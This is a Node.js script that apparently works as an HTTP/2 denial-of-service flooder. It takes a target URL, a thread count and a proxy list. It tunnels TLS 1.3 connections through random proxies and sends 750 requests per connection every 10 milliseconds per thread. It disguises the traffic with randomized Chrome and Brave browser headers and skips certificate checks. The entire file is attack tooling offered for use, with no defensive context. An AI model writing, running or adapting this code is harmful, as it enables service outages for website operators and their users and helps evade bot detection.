const fs = require('fs');
const http = require('http');
const tls = require('tls');
const crypto = require('crypto');
const url = require('url');
const { connect } = require('http2');

if (process.argv.length < 5) {
    console.log("TLSv1.3 (Normal)\nUsage: node tls [url] [thread] [proxyfile]");
    process.exit(1);
}

const target = process.argv[2];
const threadCount = parseInt(process.argv[3]);
const proxyList = fs.readFileSync(process.argv[4], 'utf-8').split('\n').map(p => p.trim()).filter(Boolean);
const delay = 10;
const requestsPerThread = 750;

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function createCustomTLSSocket(parsed, socket) {
    return tls.connect({
        ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384',
        minVersion: 'TLSv1.3',
        maxVersion: 'TLSv1.3',
        secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION |
            crypto.constants.SSL_OP_NO_TICKET |
            crypto.constants.SSL_OP_NO_SSLv2 |
            crypto.constants.SSL_OP_NO_SSLv3 |
            crypto.constants.SSL_OP_NO_COMPRESSION,
        echdCurve: "X25519",
        secure: true,
        rejectUnauthorized: false,
        ALPNProtocols: ['h2'],
        host: parsed.host,
        port: 443,
        servername: parsed.host,
        socket: socket,
        timeout: 5000
    }).on('error', () => { });
}

function sendRequest(proxy, target) {
    const parsed = url.parse(target);
    const agent = new http.Agent({
        keepAlive: true,
        keepAliveMsecs: 500000000,
        maxSockets: 50000,
        maxTotalSockets: 100000
    });

    const Optionsreq = {
        host: proxy[0],
        port: proxy[1],
        agent: agent,
        method: 'CONNECT',
        path: parsed.host + ':443',
        timeout: 3000,
        headers: {
            'Host': parsed.host,
            'Proxy-Connection': 'Keep-Alive',
            'Connection': 'Keep-Alive'
        }
    };

    const connection = http.request(Optionsreq);
    connection.on('connect', function (res, socket) {
        socket.setKeepAlive(true, 100000);
        const tlsSocket = createCustomTLSSocket(parsed, socket);
        tlsSocket.setKeepAlive(true, 600000 * 1000);
var signature_0x1 = getRandomInt(114, 134);
var cookie;
var signature_0x2 = getRandomInt(80, 99);
var signature_0x3 = getRandomInt(70, 99);
        const headers = {
        ":method": "GET",
        ":scheme": "https",
        ":authority": parsed.host,
        ":path":parsed.path,
        'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${signature_0x1}.0.0.0 Mobile Safari/537.36`,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'vi-VN,vi;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        "sec-ch-ua": `"Chromium";v="${signature_0x1}", "Not:A-Brand";v="24", "Brave";v="${signature_0x1}"`,
        "priority" : "u=${getRandomInt(0,5), i",
        "referer" : "https://" + parsed.host,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "Android",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        "sec-fetch-user": "?1",
        "sec-gpc" : "1",
        "upgrade-insecure-requests": "1",
        };

        const client = connect(`https://${parsed.host}`, {
            createConnection: () => tlsSocket
        });

        client.on('error', () => { });

        for (let i = 0; i < requestsPerThread; i++) {
            const req = client.request(headers);
            req.on('error', () => { });
            req.end();
        }
    });

    connection.on('error', () => { });
    connection.end();
}

function startThread() {
    setInterval(() => {
        const proxy = proxyList[Math.floor(Math.random() * proxyList.length)].split(':');
        sendRequest(proxy, target);
        console.log(`[${new Date().toISOString()}] --> flooder: ${proxy.join(':')} --> ${target}`);
    }, delay);
}

for (let i = 0; i < threadCount; i++) {
    startThread();
}
